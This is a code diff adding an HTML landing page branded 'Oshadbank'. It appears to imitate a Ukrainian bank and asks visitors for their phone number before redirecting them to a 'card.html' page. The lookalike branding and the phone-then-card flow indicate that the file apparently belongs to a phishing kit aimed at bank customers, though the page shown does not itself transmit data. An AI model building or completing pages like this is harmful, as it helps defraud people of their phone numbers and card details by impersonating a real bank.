@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="logo_oshadbank.png">
+    <title>Oshadbank</title>
+    <style>
+        body {
+            background-image: linear-gradient(-3deg, #f2f5fa 80%, #fdf01f 83%, #26cfc7 10%);
+        }
+
+        .logo {
+            height: 55px;
+            width: 55px;
+            background: url('logo_oshadbank.png') no-repeat center;
+        }
+
+        .logo-page {
+            width: 65px;
+            height: 65px;
+        }
+
+        .button {
+            color: #fff;
+            border-radius: 4px;
+            background-color: #26cfc7;
+        }
+
+        .bar {
+            border: 2px solid #26cfc7;
+        }
+
+        .bar::before {
+            /* background-color: #26cfc7; */
+        }
+    </style>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <div class="show_div container"></div>
+    <div class="content">
+        <div class="logo"></div>
+        <h2>Ласкаво просимо</h2>
+        <p>Вкажіть ваш номер телефону за вказаним форматом.</p>
+        <form id="myForm" method="post">
+            <input type="tel" id="phone" name="phone" data-text="Номер телефону" placeholder="+380 00 000 00 00" minlength="9" maxlength="15" autocomplete="off">
+            <p class="format">Номер в форматi: +380 XX XXX XX XX</p>
+            <button type="submit" class="button">Далi</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Отменяем отправку формы по умолчанию
+            window.location.href = "card.html"; // Перенаправляем пользователя на страницу "card.html"
+        });
+    </script>
+</body>
+
+</html>
